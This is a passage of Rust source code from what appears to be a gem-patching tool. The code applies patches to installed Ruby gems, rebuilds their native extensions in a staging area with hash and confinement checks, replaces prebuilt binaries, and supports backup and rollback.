                "{}: unreadable dependency output",
                probe.ruby.display()
            ));
        }
        let missing: Vec<(String, String)> = tagged_lines(&stdout, "sp_missing")
            .into_iter()
            .filter_map(|fields| Some((fields.first()?.to_string(), fields.get(1)?.to_string())))
            .collect();
        if missing.is_empty() {
            return Ok(());
        }
        for (name, requirement) in missing {
            let needed =
                format!("its build needs the gem {name} ({requirement}), which is not installed");
            if gems.offline() {
                return Err(format!("{needed}, and this run is offline"));
            }
            // Staged a moment ago and still missing: installing it again
            // would loop.
            if staged_names.contains(&name) || staged_names.len() >= MAX_STAGED_DEPENDENCIES {
                return Err(format!("{needed} and could not be staged for the build"));
            }
            stage.beat();
            let (id, bytes) = gems
                .dependency(&name, &requirement, &versions)
                .await
                .map_err(|why| format!("{needed} and could not be downloaded ({why})"))?;
            let archive = stage.root.join(format!("{}.gem", id.full_name()));
            {
                let archive = archive.clone();
                crate::utils::fs::run_blocking(move || std::fs::write(archive, bytes))
                    .await
                    .map_err(|e| format!("{needed} and could not be staged ({e})"))?;
            }
            let run = RubyRun::Install {
                archive: &archive,
                stage_home: &stage.home,
            };
            stage.beat();
            // A gem the build needs may have an extension of its own.
            env.say(&format!(
                "Installing {} into the build stage: the build of {} needs it.",
                id.full_name(),
                copy.full_name
            ));
            let stdout = run_ruby(&probe.ruby, run, copy, env, BUILD_TIMEOUT)
                .await
                .map_err(|why| format!("{needed} and did not install into the stage:\n{why}"))?;
            if parse_installed(&stdout).is_none_or(|(full_name, _)| full_name != id.full_name()) {
                return Err(format!("{needed} and did not install into the stage"));
            }
            staged_names.push(name);
        }
    }
}

/// Whether a gem path is under one of `require_paths` (a gem that requires
/// from its root says nothing about a file).
fn under_require_path(path: &str, require_paths: &[String]) -> bool {
    require_paths.iter().any(|require_path| {
        let dir = require_path.trim_start_matches("./").trim_end_matches('/');
        !dir.is_empty()
            && dir != "."
            && path
                .strip_prefix(dir)
                .is_some_and(|rest| rest.starts_with('/'))
    })
}

/// Whether a file name is a shared library's (`x.so`, `x.bundle`,
/// `libx.dylib`, `x.dll`, `libx.so.1`, or the suffix `dlext` of the
/// building Ruby): what Ruby, or FFI, loads compiled code from.
fn is_library_name(leaf: &str, dlext: Option<&str>) -> bool {
    let lower = leaf.to_ascii_lowercase();
    lower.contains(".so.")
        || lower.rsplit_once('.').is_some_and(|(stem, ext)| {
            !stem.is_empty()
                && (["so", "bundle", "dylib", "dll"].contains(&ext) || dlext == Some(ext))
        })
}

/// Whether Ruby could load the gem file `rel`: it is under a require path,
/// or a shared library by name wherever it sits.
fn is_loadable(rel: &str, require_paths: &[String], dlext: Option<&str>) -> bool {
    under_require_path(rel, require_paths) || is_library_name(leaf_of(rel), dlext)
}

/// The files of the gem tree at `gem_dir` that Ruby could load
/// ([`is_loadable`]), each with its git-sha256.
fn loadable_files(
    gem_dir: &Path,
    require_paths: &[String],
    dlext: Option<&str>,
) -> BTreeMap<String, String> {
    tree_files(gem_dir)
        .into_iter()
        .filter(|rel| is_loadable(rel, require_paths, dlext))
        .filter_map(|rel| {
            let hash = compute_file_git_sha256_sync(&gem_dir.join(&rel)).ok()?;
            Some((rel, hash))
        })
        .collect()
}

/// What a staged build left in the staged gem's own tree that Ruby could
/// load, beyond what it left in the extension dir: every loadable file
/// ([`loadable_files`]) the build created or changed (`before` is the tree
/// as it was built from), other than the `lib/` copies RubyGems makes of
/// the extension dir's artifacts and files that are byte for byte one of
/// those artifacts (a build dir `make clean` did not empty).
///
/// A gem whose build leaves a library there loads it from there (an FFI
/// gem's `ext/<name>/lib<name>.so`, a Rakefile build's `lib/<name>.so`).
/// Moving the extension dir in would leave the installed copy loading the
/// old one, and such a library can carry the paths of the tree it was
/// built in: that gem is built where it is installed, or not at all.
fn in_tree_products(
    built: &StagedBuild,
    before: &BTreeMap<String, String>,
    probe: &Probe,
) -> Vec<String> {
    let dlext = probe.facts.as_ref().map(|facts| facts.dlext.as_str());
    let artifacts = artifact_rels(&built.extension_dir);
    let lib_copies: Vec<String> = artifacts
        .iter()
        .map(|rel| format!("{}/{rel}", probe.require_path))
        .collect();
    let artifact_hashes: Vec<String> = artifacts
        .iter()
        .filter_map(|rel| compute_file_git_sha256_sync(&built.extension_dir.join(rel)).ok())
        .collect();
    loadable_files(&built.gem.gem_dir, &probe.require_paths, dlext)
        .into_iter()
        .filter(|(rel, hash)| {
            before.get(rel) != Some(hash)
                && !lib_copies.contains(rel)
                && !artifact_hashes.contains(hash)
        })
        .map(|(rel, _)| rel)
        .collect()
}

/// A record to lay over a staged source gem.
struct StagedRecord<'a> {
    read_scope: crate::utils::repo_root::ReadScope,
    package_key: &'a str,
    /// The installed copy, whose already patched files can stand in for
    /// blobs ([`stage_blobs`]).
    pkg_path: &'a Path,
    scope: &'a NativeScope,
    files: &'a HashMap<String, PatchFileInfo>,
    sources: &'a PatchSources<'a>,
}

/// Build the extension of `copy` from `archive` (its source gem, `source`)
/// in a stage inside its gem home, with `record` laid over the sources
/// (`None`: the gem as it shipped). Nothing of the installed copy is
/// touched. The steps, each of which must hold before the next:
///
/// 1. RubyGems unpacks the archive, which must be that gem and declare
///    extensions ([`unpack_in_stage`]).
/// 2. The unpacked tree is proven to be the installed copy's own source
///    ([`prove_own_source`]).
/// 3. The record is applied to it, every `beforeHash` holding
///    ([`patch_staged_gem`]).
/// 4. The gems its build lacks are staged beside it
///    ([`stage_dependencies`]), and RubyGems builds its extensions.
/// 5. The build left nothing Ruby loads outside the extension dir
///    ([`in_tree_products`]).
///
/// `Ok` hands back the open stage with the build in it; the caller closes
/// it ([`close_stage`]) once the build is in place. On `Err` the stage is
/// gone.
async fn build_from_source_gem(
    copy: &GemCopy,
    probe: &Probe,
    source: &GemId,
    archive: Vec<u8>,
    gems: &GemSource,
    env: &RubyEnv,
    record: Option<&StagedRecord<'_>>,
) -> Result<(Stage, StagedBuild), StageFailure> {
    let stage = {
        let copy = copy.clone();
        crate::utils::fs::run_blocking(move || open_stage(&copy)).await?
    };
    let built = build_in_stage(copy, probe, source, archive, gems, env, record, &stage).await;
    match built {
        Ok(built) => Ok((stage, built)),
        Err(failure) => {
            close_stage(stage, copy).await;
            Err(failure)
        }
    }
}

/// [`build_from_source_gem`], inside its open stage.
#[allow(clippy::too_many_arguments)]
async fn build_in_stage(
    copy: &GemCopy,
    probe: &Probe,
    source: &GemId,
    archive: Vec<u8>,
    gems: &GemSource,
    env: &RubyEnv,
    record: Option<&StagedRecord<'_>>,
    stage: &Stage,
) -> Result<StagedBuild, StageFailure> {
    let staged = unpack_in_stage(copy, probe, source, archive, stage, env)
        .await
        .map_err(StageFailure::Unpack)?;
    {
        let (installed, unpacked) = (copy.gem_dir.clone(), staged.gem_dir.clone());
        let files = record.map(|r| r.files.clone()).unwrap_or_default();
        crate::utils::fs::run_blocking(move || prove_own_source(&installed, &unpacked, &files))
            .await
            .map_err(StageFailure::NotOwnSource)?;
    }
    // What the installed copy's build used up of the gem, while the stage
    // still holds it: only a copy RubyGems built is ever built in place.
    let used_up = if source.full_name() == copy.full_name {
        let (installed, unpacked) = (copy.gem_dir.clone(), staged.gem_dir.clone());
        crate::utils::fs::run_blocking(move || used_up_files(&installed, &unpacked)).await
    } else {
        Vec::new()
    };
    // The record over the pristine source gem, before anything runs.
    if let Some(record) = record {
        let blobs = stage_blobs(record.pkg_path, record.files, record.sources).await;
        let sources = PatchSources {
            blobs_path: record.sources.blobs_path,
            mem_blobs: Some(&blobs),
        };
        patch_staged_gem(
            record.read_scope,
            record.package_key,
            &staged,
            record.scope,
            record.files,
            &sources,
        )
        .await
        .map_err(StageFailure::Mismatch)?;
    }
    let dlext = probe.facts.as_ref().map(|facts| facts.dlext.clone());
    let before = {
        let (gem_dir, require_paths) = (staged.gem_dir.clone(), probe.require_paths.clone());
        crate::utils::fs::run_blocking(move || {
            loadable_files(&gem_dir, &require_paths, dlext.as_deref())
        })
        .await
    };
    stage_dependencies(copy, probe, &staged, stage, gems, env)
        .await
        .map_err(StageFailure::Dependencies)?;
    let run = RubyRun::StageBuild {
        spec: &staged.spec_path,
        stage_home: &stage.home,
        // The source gem of a copy RubyGems built is the copy's own gem; a
        // precompiled copy's is the ruby-platform gem of its version.
        recorded_args: source.full_name() == copy.full_name,
    };
    stage.beat();
    // Nothing reads the staged tree between here and the check below but
    // the build.
    let watch = match record {
        Some(record) => {
            let (gem_dir, scope) = (staged.gem_dir.clone(), record.scope.clone());
            Some(crate::utils::fs::run_blocking(move || watch_inputs(&gem_dir, &scope)).await)
        }
        None => None,
    };
    let from = match record {
        Some(_) => "its source gem with the patch applied",
        None => "its source gem",
    };
    let stdout = run_build(probe, run, copy, env, from)
        .await
        .map_err(StageFailure::Build)?;
    if let Some(watch) = watch {
        let (gem_dir, root) = (staged.gem_dir.clone(), stage.root.clone());
        let unread =
            crate::utils::fs::run_blocking(move || unread_inputs(&gem_dir, &watch, &root)).await;
        if unread.is_some() {
            return Err(StageFailure::NotRead);
        }
    }
    let reported = tagged_lines(&stdout, "sp_built")
        .into_iter()
        .find_map(|fields| fields.first().map(PathBuf::from))
        .ok_or_else(|| {
            StageFailure::Build(format!("{}: unreadable build output", probe.ruby.display()))
        })?;
    // The one dir RubyGems builds this gem into, inside the stage home.
    let label = ext_dir_label(&stage.home, &reported);
    let extension_dir = stage.home.join(&label);
    if !is_confined_ext_label(&source.full_name(), &label)
        || !extension_dir.join(BUILD_COMPLETE).is_file()
    {
        return Err(StageFailure::Build(format!(
            "the build exited cleanly but left no finished extension in the stage ({})",
            reported.display()
        )));
    }
    let built = StagedBuild {
        gem: staged,
        extension_dir,
        label,
    };
    let (products, created) = {
        let (built, probe) = (built.clone(), probe.clone());
        crate::utils::fs::run_blocking(move || {
            let products = in_tree_products(&built, &before, &probe);
            let created = products
                .iter()
                .filter(|rel| !before.contains_key(*rel))
                .cloned()
                .collect();
            (products, created)
        })
        .await
    };
    if !products.is_empty() {
        return Err(StageFailure::InTree {
            products,
            seen: SeenInStage { created, used_up },
        });
    }
    Ok(built)
}

/// Move the tree `from` to `to` (which is not there): a rename on one
/// filesystem, a copy across two.
fn move_tree(from: &Path, to: &Path) -> std::io::Result<()> {
    if let Some(parent) = to.parent() {
        std::fs::create_dir_all(parent)?;
    }
    match std::fs::rename(from, to) {
        Ok(()) => Ok(()),
        Err(_) => copy_tree_sync(from, to),
    }
}

/// A regular file, not a symlink to one.
fn is_real_file(path: &Path) -> bool {
    std::fs::symlink_metadata(path).is_ok_and(|m| m.is_file())
}

/// Replace `dst` with the bytes of the regular file `src` ([`replace_file`]),
/// with `mode`'s permissions, or `src`'s when there is none to keep.
fn replace_with_file(
    src: &Path,
    dst: &Path,
    mode: Option<std::fs::Permissions>,
) -> std::io::Result<()> {
    let bytes = read_regular_to_bytes_sync(src)?;
    let perms = match mode {
        Some(perms) => perms,
        None => std::fs::metadata(src)?.permissions(),
    };
    replace_file(dst, |stage| {
        std::fs::write(stage, &bytes)?;
        std::fs::set_permissions(stage, perms)
    })
}

/// Put a staged build in the place of the installed copy's: the staged
/// extension dir becomes the copy's, and the `lib/` copies RubyGems made of
/// its artifacts in the stage replace the installed ones. The original
/// build is backed up first (`back_up`: with the record's files the copy
/// did not hold), the current one is parked while the new one moves in, and
/// the marker records the result, exactly as an in-place [`rebuild`] leaves
/// them. On failure the previous build is put back.
fn install_staged_build(
    copy: &GemCopy,
    probe: &Probe,
    scope: &NativeScope,
    files: &HashMap<String, PatchFileInfo>,
    staged: &StagedBuild,
    back_up: Option<&[String]>,
) -> Result<(), String> {
    // The stage was built by the Ruby that owns the copy, so both name the
    // same `extensions/<platform>/<abi>/<full_name>`.
    if staged.label != ext_dir_label(&copy.home, &probe.extension_dir) {
        return Err(format!(
            "the staged build is in {}, not the installed extension's {}",
            staged.label,
            probe.extension_dir.display()
        ));
    }
    let made_backup = match back_up {
        Some(absent) => back_up_original(copy, probe, absent)
            .map_err(|e| format!("could not back up the original extension build: {e}"))?,
        None => false,
    };
    let drop_new_backup = || {
        if made_backup {
            let _ = remove_dir_if_exists(&copy.gem_dir.join(BACKUP_DIR));
        }
    };
    let aside = match set_aside(copy, probe) {
        Ok(aside) => aside,
        Err(e) => {
            drop_new_backup();
            return Err(format!(
                "could not move the current extension build aside: {e}"
            ));
        }
    };
    let moved_in = (|| -> std::io::Result<()> {
        move_tree(&staged.extension_dir, &probe.extension_dir)?;
        for rel in artifact_rels(&probe.extension_dir) {
            let Some(lib) = lib_rel(probe, &rel) else {
                continue;
            };
            // RubyGems copies an artifact under the require dir unless
            // `Gem.install_extension_in_lib` is off: the staged gem shows
            // which it did.
            if is_real_file(&staged.gem.gem_dir.join(&lib)) {
                replace_with_file(
                    &probe.extension_dir.join(&rel),
                    &copy.gem_dir.join(&lib),
                    None,
                )?;
            }
        }
        commit_build(copy, probe, scope, files, &aside, &[])
    })();
    let Err(error) = moved_in else {
        return Ok(());
    };
    match put_back(copy, probe, aside) {
        Ok(()) => {
            drop_new_backup();
            Err(format!(
                "the rebuilt extension could not be moved into place: {error}"
            ))
        }
        Err(e) => Err(format!(
            "the rebuilt extension could not be moved into place: {error}\n(the previous build \
             could not be put back: {e}; run `gem pristine {} --extensions` to rebuild it)",
            gem_name_of(&copy.full_name)
        )),
    }
}

/// One prebuilt binary of a precompiled copy, and the staged artifact that
/// replaces it.
#[derive(Debug, Clone, PartialEq, Eq)]
struct Graft {
    staged: PathBuf,
    /// The prebuilt binary, relative to the gem dir
    /// (`lib/nokogiri/3.4/nokogiri.bundle`).
    target: String,
}

/// Every regular file named `leaf` under `dir`, a dir inside `base`, as
/// paths relative to `base` ([`tree_files`]).
fn files_named(dir: &Path, leaf: &str, base: &Path) -> Vec<String> {
    let Ok(prefix) = dir.strip_prefix(base) else {
        return Vec::new();
    };
    let prefix: Vec<String> = prefix
        .components()
        .map(|c| c.as_os_str().to_string_lossy().into_owned())
        .collect();
    tree_files(dir)
        .into_iter()
        .filter(|rel| leaf_of(rel) == leaf)
        .map(|rel| {
            let mut parts = prefix.clone();
            parts.push(rel);
            parts.join("/")
        })
        .collect()
}

/// Match every extension the staged build produced to the prebuilt binary
/// of `copy` that Ruby loads in its place.
///
/// A precompiled gem keeps one binary per Ruby minor in the rake-compiler
/// layout, `<require path>/<dir>/<major.minor>/<file>` (nokogiri's
/// `lib/nokogiri/3.4/nokogiri.bundle`, sqlite3's
/// `lib/sqlite3/3.3/sqlite3_native.so`), where a source build has
/// `<dir>/<file>`; the building Ruby's minor picks the one. A gem that
/// keeps a single binary elsewhere is matched by its file name when exactly
/// one file under the require path has it. `Err` when an extension has no
/// counterpart, or more than one: grafting on a guess would leave Ruby
/// loading the old code.
fn plan_graft(copy: &GemCopy, probe: &Probe, staged: &StagedBuild) -> Result<Vec<Graft>, String> {
    let facts = probe
        .facts
        .as_ref()
        .ok_or_else(|| format!("{} did not say which Ruby it is", probe.ruby.display()))?;
    let minor = facts.minor().ok_or_else(|| {
        format!(
            "{} reports the Ruby version {:?}",
            probe.ruby.display(),
            facts.ruby_version
        )
    })?;
    let built: Vec<String> = artifact_rels(&staged.extension_dir)
        .into_iter()
        .filter(|rel| {
            rel.rsplit_once('.')
                .is_some_and(|(_, ext)| ext == facts.dlext)
        })
        .collect();
    if built.is_empty() {
        return Err(format!(
            "the source gem's build left no .{} extension to replace a prebuilt one with",
            facts.dlext
        ));
    }
    let gem_root = canonical(&copy.gem_dir);
    let mut grafts: Vec<Graft> = Vec::new();
    for rel in built {
        let (dir, leaf) = match rel.rsplit_once('/') {
            Some((dir, leaf)) => (format!("{dir}/"), leaf),
            None => (String::new(), rel.as_str()),
        };
        let exact = format!("{}/{dir}{minor}/{leaf}", probe.require_path);
        let target = if is_real_file(&copy.gem_dir.join(&exact)) {
            exact
        } else {
            let mut named = files_named(&probe.lib_dir, leaf, &copy.gem_dir);
            match named.len() {
                1 => named.remove(0),
                0 => {
                    return Err(format!(
                        "the gem ships no prebuilt {leaf} for Ruby {minor} ({exact} is not there)"
                    ))
                }
                _ => {
                    return Err(format!(
                        "the gem ships no prebuilt {leaf} for Ruby {minor} ({exact} is not \
                         there), only {}",
                        named.join(", ")
                    ))
                }
            }
        };
        // Inside the gem dir, whatever links its tree holds.
        let confined = is_safe_relative_subpath(&target)
            && match (&gem_root, canonical(&copy.gem_dir.join(&target))) {
                (Some(root), Some(path)) => path.starts_with(root),
                _ => false,
            };
        if !confined || grafts.iter().any(|g| g.target == target) {
            return Err(format!(
                "the prebuilt binary {target} cannot be told apart from another file to replace"
            ));
        }
        grafts.push(Graft {
            staged: staged.extension_dir.join(&rel),
            target,
        });
    }
    Ok(grafts)
}

/// Back up the prebuilt binaries a graft is about to replace to
/// [`BACKUP_DIR`], with the record's files the copy never shipped
/// (`absent`). A binary the copy's marker lists is socket-patch's build:
/// its original is in the backup already, or gone. A backup that exists
/// takes in the binaries it does not hold yet (a graft under another Ruby
/// replaces another of the gem's binaries) and the `absent` files it does
/// not list. `Ok(true)` when this call made the backup.
fn back_up_prebuilt(copy: &GemCopy, grafts: &[Graft], absent: &[String]) -> std::io::Result<bool> {
    let backup = copy.gem_dir.join(BACKUP_DIR);
    let marker = read_marker_sync(&copy.gem_dir);
    let original = |target: &str| {
        !marker
            .as_ref()
            .is_some_and(|m| m.grafted && m.lib_artifacts.contains_key(target))
    };
    let save = |into: &Path, target: &str| -> std::io::Result<()> {
        let src = copy.gem_dir.join(target);
        let dst = into.join("lib").join(target);
        if let Some(parent) = dst.parent() {
            std::fs::create_dir_all(parent)?;
        }
        std::fs::write(&dst, read_regular_to_bytes_sync(&src)?)?;
        std::fs::set_permissions(&dst, std::fs::symlink_metadata(&src)?.permissions())
    };
    // As [`back_up_original`]: only "not there" makes a new backup.
    if let Some(kind) = try_entry_type(&backup)? {
        let known = kind
            .is_dir()
            .then(|| read_regular_to_bytes_sync(&backup.join(BACKUP_INFO)).ok())
            .flatten()
            .and_then(|bytes| serde_json::from_slice::<BackupInfo>(&bytes).ok());
        if let Some(mut info) = known.filter(|info| info.grafted) {
            let before = (info.lib_files.len(), info.absent_files.len());
            for graft in grafts {
                if original(&graft.target) && !info.lib_files.contains(&graft.target) {
                    save(&backup, &graft.target)?;
                    info.lib_files.push(graft.target.clone());
                }
            }
            for path in absent {
                if !info.absent_files.contains(path) {
                    info.absent_files.push(path.clone());
                }
            }
            if before != (info.lib_files.len(), info.absent_files.len()) {
                write_backup_info(&backup, &info)?;
            }
        }
        return Ok(false);
    }
    // A marker that cannot be read says nothing of which binaries are the
    // gem's own.
    if marker.is_none() && try_entry_type(&copy.gem_dir.join(MARKER_FILE))?.is_some() {
        return Ok(false);
    }
    let fresh: Vec<&Graft> = grafts.iter().filter(|g| original(&g.target)).collect();
    if fresh.is_empty() {
        return Ok(false);
    }
    let stage = copy.gem_dir.join(format!("{BACKUP_DIR}.tmp"));
    remove_dir_if_exists(&stage)?;
    std::fs::create_dir_all(&stage)?;
    for graft in &fresh {
        save(&stage, &graft.target)?;
    }
    let info = BackupInfo {
        lib_files: fresh.iter().map(|g| g.target.clone()).collect(),
        grafted: true,
        absent_files: absent.to_vec(),
        ..BackupInfo::default()
    };
    write_backup_info(&stage, &info)?;
    std::fs::rename(&stage, &backup)?;
    Ok(true)
}

/// Replace each prebuilt binary with the staged build's ([`replace_file`]:
/// a Ruby that has the old one mapped keeps its pages), then record the
/// marker that attests them. The marker keeps the binaries an earlier
/// graft of the same record replaced for another Ruby, while they are
/// still the built ones. A step that fails puts every binary back as it
/// was.
fn graft_binaries(
    copy: &GemCopy,
    scope: &NativeScope,
    files: &HashMap<String, PatchFileInfo>,
    grafts: &[Graft],
) -> std::io::Result<()> {
    let mut previous: Vec<LibSnapshot> = Vec::new();
    for graft in grafts {
        let path = copy.gem_dir.join(&graft.target);
        let perms = std::fs::symlink_metadata(&path)?.permissions();
        previous.push((
            graft.target.clone(),
            read_regular_to_bytes_sync(&path)?,
            perms,
        ));
    }
    let earlier = read_marker_sync(&copy.gem_dir).filter(|m| {
        m.grafted && marker_sources_match(m, scope, files) && marker_artifacts_hold(m, copy, scope)
    });
    let grafted = (|| -> std::io::Result<()> {
        let mut marker = BuildMarker {
            schema: GRAFT_MARKER_SCHEMA,
            grafted: true,
            lib_artifacts: earlier.map(|m| m.lib_artifacts).unwrap_or_default(),
            ..BuildMarker::default()
        };
        for key in &scope.inputs {
            if let Some(info) = files.get(key) {
                marker.sources.insert(
                    normalize_file_path(key).to_string(),
                    info.after_hash.clone(),
                );
            }
        }
        for (graft, (_, _, perms)) in grafts.iter().zip(&previous) {
            let path = copy.gem_dir.join(&graft.target);
            replace_with_file(&graft.staged, &path, Some(perms.clone()))?;
            marker
                .lib_artifacts
                .insert(graft.target.clone(), compute_file_git_sha256_sync(&path)?);
        }
        write_marker(copy, &marker)
    })();
    if grafted.is_err() {
        for (target, bytes, perms) in &previous {
            let _ = replace_file(&copy.gem_dir.join(target), |stage| {
                std::fs::write(stage, bytes)?;
                std::fs::set_permissions(stage, perms.clone())
            });
        }
    }
    grafted
}

/// The record as the installed copy takes it. A build input the copy does
/// not hold is added to it, whatever content the record says it replaces:
/// the source gem packs files an installed copy lacks (a precompiled gem
/// never shipped nokogiri's `patches/**`; a build deletes its `ports/**`
/// once it is done). That content is checked where it exists, in the
/// source gem the extension is rebuilt from ([`patch_staged_gem`]), so the
/// result is only used for a rebuild from that gem. Returns the record so
/// adjusted and the (normalized) paths it adds.
async fn files_as_installed(
    copy: &GemCopy,
    scope: &NativeScope,
    files: &HashMap<String, PatchFileInfo>,
) -> (HashMap<String, PatchFileInfo>, Vec<String>) {
    let mut out = files.clone();
    let mut absent = Vec::new();
    for key in &scope.inputs {
        let Some(info) = out.get_mut(key).filter(|i| !i.before_hash.is_empty()) else {
            continue;
        };
        let path = normalize_file_path(key);
        let missing = is_safe_relative_subpath(path)
            && matches!(
                tokio::fs::symlink_metadata(copy.gem_dir.join(path)).await,
                Err(e) if e.kind() == std::io::ErrorKind::NotFound
            );
        if missing {
            info.before_hash.clear();
            absent.push(path.to_string());
        }
    }
    (out, absent)
}

/// The platform of the gem copy at `pkg_path` when it is a platform gem's
/// (`arm64-darwin`, `x86_64-linux-gnu`, `java`), as its dir name and
/// gemspec text say. `None` for a `ruby`-platform copy and for a dir that
/// is no RubyGems install.
async fn copy_platform(pkg_path: &Path) -> Option<String> {
    let copy = GemCopy::of(pkg_path)?;
    let spec_text = crate::utils::fs::read_regular_to_string(&copy.spec_path)
        .await
        .ok()?;
    SpecFacts::of(&spec_text, &copy.full_name).platform
}

/// Of the manifest records `keys` (the purls of one gem version), the one
/// written for the platform of the gem copy at `pkg_path` itself: the
/// record that is the copy's own. `None`: the copy is the `ruby`
/// platform's, it is no RubyGems install, or no record names its platform.
///
/// Every reader that picks records for a copy asks this (`apply`,
/// `apply --check`, `vex`, `rollback`): when the copy's own record matches
/// it, that record alone is the copy's, and the ruby-platform record of
/// the same version is not applied to it or judged on it.
pub async fn own_platform_record<'k>(
    pkg_path: &Path,
    keys: impl IntoIterator<Item = &'k str>,
) -> Option<&'k str> {
    let platform = copy_platform(pkg_path).await?;
    keys.into_iter().find(|key| names_platform(key, &platform))
}

/// Whether the manifest record `key` (a purl) is the one written for gems
/// of `platform`: its `platform` qualifier names it. RubyGems spells the
/// glibc Linux platform with and without `-gnu`, by version; the two are
/// one platform.
fn names_platform(key: &str, platform: &str) -> bool {
    let plain = |p: &str| p.to_ascii_lowercase().trim_end_matches("-gnu").to_string();
    crate::utils::purl::purl_qualifier(key, "platform")
        .is_some_and(|named| plain(named) == plain(platform))
}

/// The files of the record `key` (a manifest purl) that can tell whether the
/// gem copy at `pkg_path` is the distribution the record was written for.
/// A release variant is matched to an installed copy by a file it replaces
/// ([`select_installed_variants`](crate::patch::apply::select_installed_variants)):
/// one that is missing means another distribution. That does not hold for a
/// build input of the ruby-platform record that an installed native gem
/// does not hold ([`files_as_installed`]): its absence says the copy was
/// built, not that it is another gem, and the source gem is where its
/// content is checked. Those files are left out.
///
/// On the JVM build of a gem (what JRuby installs) the ruby-platform
/// record is matched by the files that build takes of it
/// ([`installed_files`]): one the copy holds must hold the record's
/// content, and one it does not hold says nothing.
///
/// Any other record or copy: `files` as they are (a `java` record stays
/// unmatched on an MRI copy, and a record qualified for another platform
/// on a JRuby one).
pub async fn discriminating_files<'f>(
    pkg_path: &Path,
    key: &str,
    files: &'f HashMap<String, PatchFileInfo>,
) -> std::borrow::Cow<'f, HashMap<String, PatchFileInfo>> {
    use std::borrow::Cow;
    let is_gem = crate::crawlers::types::Ecosystem::from_purl(key)
        == Some(crate::crawlers::types::Ecosystem::Gem);
    if !is_gem || !is_ruby_platform_record(key) {
        return Cow::Borrowed(files);
    }
    let gem = InstalledGem::at(pkg_path).await;
    if gem.jvm().is_some() {
        return gem.record_files(key, files).await;
    }
    let scope = gem.scope(files);
    let Some(copy) = gem.copy.filter(|_| !scope.inputs.is_empty()) else {
        return Cow::Borrowed(files);
    };
    if !scope.builds_extensions && scope.precompiled.is_none() {
        return Cow::Borrowed(files);
    }
    let (_, absent) = files_as_installed(&copy, &scope, files).await;
    if absent.is_empty() {
        return Cow::Borrowed(files);
    }
    let mut telling = files.clone();
    telling.retain(|key, _| !absent.iter().any(|path| path == normalize_file_path(key)));
    Cow::Owned(telling)
}

/// The record's files as `rollback` undoes them on the gem copy at
/// `pkg_path`. A build input `apply` added to a copy that did not hold it
/// ([`files_as_installed`]; the copy's backup lists them) is removed, not
/// restored to the content it has in the source gem. On the JVM build of a
/// gem, only the files `apply` wrote there for the record `key` (a manifest
/// purl) are undone ([`installed_files`]): one it skipped is not there to
/// restore. Any other copy: `files` as they are.
pub async fn rollback_files(
    pkg_path: &Path,
    key: &str,
    files: &HashMap<String, PatchFileInfo>,
) -> HashMap<String, PatchFileInfo> {
    let mut out = installed_files(pkg_path, key, files).await.into_owned();
    let Some(copy) = GemCopy::of(pkg_path) else {
        return out;
    };
    let info = crate::utils::fs::run_blocking(move || {
        let backup = copy.gem_dir.join(BACKUP_DIR);
        // A backup this tool made is a directory. A link there, or an
        // entry that cannot be told from one, is not read through.
        refuse_link(&backup, "a backup").ok()?;
        let bytes = read_regular_to_bytes_sync(&backup.join(BACKUP_INFO)).ok()?;
        serde_json::from_slice::<BackupInfo>(&bytes).ok()
    })
    .await;
    let Some(info) = info else {
        return out;
    };
    for (key, file) in out.iter_mut() {
        if info
            .absent_files
            .iter()
            .any(|path| path == normalize_file_path(key))
        {
            file.before_hash.clear();
        }
    }
    out
}

/// `name` of a `name-version[-platform]` dir, for the `gem pristine` hint:
/// the first `-` followed by a digit starts the version (gem names rarely
/// hold one).
fn gem_name_of(full_name: &str) -> &str {
    let bytes = full_name.as_bytes();
    (0..bytes.len())
        .find(|&i| bytes[i] == b'-' && bytes.get(i + 1).is_some_and(u8::is_ascii_digit))
        .map_or(full_name, |i| &full_name[..i])
}

/// The result of a copy in which nothing was verified and nothing written:
/// one that was refused (`error` says why), or one left as it was on
/// purpose (no `error`: it succeeded).
fn untouched_result(package_key: &str, pkg_path: &Path, error: Option<String>) -> ApplyResult {
    ApplyResult {
        package_key: package_key.to_string(),
        package_path: pkg_path.display().to_string(),
        success: error.is_none(),
        files_verified: Vec::new(),
        files_patched: Vec::new(),
        applied_via: HashMap::new(),
        error,
        sidecar: None,
        cause: None,
    }
}

fn refusal(package_key: &str, pkg_path: &Path, code: &str, detail: String) -> GemApplied {
    GemApplied {
        caveat: None,
        result: untouched_result(package_key, pkg_path, Some(format!("{code}: {detail}"))),
        warning: Some((code.to_string(), detail)),
    }
}

fn list_inputs(scope: &NativeScope) -> String {
    let shown: Vec<&str> = scope
        .inputs
        .iter()
        .take(3)
        .map(|k| normalize_file_path(k))
        .collect();
    let more = scope.inputs.len().saturating_sub(shown.len());
    if more > 0 {
        format!("{} and {more} more", shown.join(", "))
    } else {
        shown.join(", ")
    }
}

/// [`apply_package_patch`] over a gem copy, with no warning of its own.
async fn plain_apply(
    read_scope: crate::utils::repo_root::ReadScope,
    package_key: &str,
    pkg_path: &Path,
    files: &HashMap<String, PatchFileInfo>,
    sources: &PatchSources<'_>,
    dry_run: bool,
    policy: MismatchPolicy,
) -> GemApplied {
    GemApplied {
        caveat: None,
        result: apply_package_patch(
            read_scope,
            package_key,
            pkg_path,
            files,
            sources,
            dry_run,
            policy,
        )
        .await,
        warning: None,
    }
}

/// The [`NOT_REBUILT_REASON`] warning of `--no-gem-native-rebuild`: the
/// record's sources (`inputs`) are written and what is compiled from them
/// is left to the caller, the extension of a gem or (`jars`) the jars of a
/// JVM gem. A `dry_run` writes nothing and says what `apply` would do.
fn opted_out_warning(
    package_key: &str,
    inputs: &str,
    jars: bool,
    dry_run: bool,
) -> (String, String) {
    let detail = match (jars, dry_run) {
        (false, false) => format!(
            "{package_key}: the patch changes native-extension sources ({inputs}), written \
             without rebuilding the extension (--no-gem-native-rebuild); Ruby loads the old \
             build until it is recompiled, and vex does not attest it"
        ),
        (false, true) => format!(
            "{package_key}: dry run: the patch changes native-extension sources ({inputs}); \
             apply would write them without rebuilding the extension \
             (--no-gem-native-rebuild), Ruby would load the old build until it is recompiled, \
             and vex would not attest it"
        ),
        (true, false) => format!(
            "{package_key}: the patch changes sources of the gem's jars ({inputs}), written \
             without rebuilding them (--no-gem-native-rebuild); JRuby loads the old jars until \
             they are rebuilt, and vex does not attest it"
        ),
        (true, true) => format!(
            "{package_key}: dry run: the patch changes sources of the gem's jars ({inputs}); \
             apply would write them without rebuilding the jars (--no-gem-native-rebuild), \
             JRuby would load the old jars until they are rebuilt, and vex would not attest it"
        ),
    };
    (NOT_REBUILT_REASON.to_string(), detail)
}

/// What is wrong with a copy that holds the record's files (or, on a
